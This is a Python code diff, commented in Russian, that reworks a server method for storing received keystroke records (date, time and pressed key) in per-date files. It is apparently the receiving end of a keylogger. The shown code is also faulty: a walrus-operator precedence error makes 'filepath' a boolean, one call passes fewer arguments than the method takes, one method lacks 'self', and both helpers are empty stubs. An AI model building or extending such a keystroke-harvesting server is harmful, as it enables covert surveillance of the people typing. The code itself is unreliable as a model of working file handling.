@@ -49,21 +49,37 @@ class Server:
 
 
     def __save_data(self, data: list[str]) -> None: 
-        for record in data:
+        # создание папки data, если ее не существует
+        if not os.path.exists(self._path_to_data_dir):
+            os.makedirs(self._path_to_data_dir)
+       
+        # проходимся по каждой записи нажатия клавиш в истории нажатий
+        for i, record in enumerate(data):
+            # получаем дату, время и ключ (название нажатой клавиши)
             try:
                 date, time, key = record.split(":")
-            except: continue
+            except: continue   
 
-            # создание папки data, если ее не существует
-            if not os.path.exists(self._path_to_data_dir):
-                os.makedirs(self._path_to_data_dir)
-
+            print(f"{i+1}. {date} : {time} - {key}")     
+            
+            # список всех файлов в папке data
             files: list[str] = os.listdir(self._path_to_data_dir)
             
-            if date := os.path.join(self._path_to_data_dir, date+".txt") not in files:
-                pass
-            else: ...
+            # проверяем есть ли файл с текущей датой в папке data
+            if filepath := os.path.join(self._path_to_data_dir, date+".txt") not in files:
+                self.__create_file(filepath)
+            
+            # добавление записи в файл
+            self.__add_to_file(filepath, record)
 
+    
+    def __create_file(self, filepath: str, content: str) -> None:
+        ...
+
+
+    def __add_to_file(filepath: str, record: str) -> None:
+        ...
+             
 
     def __get_data(self, conn: socket.socket) -> tuple[str]: 
         try:
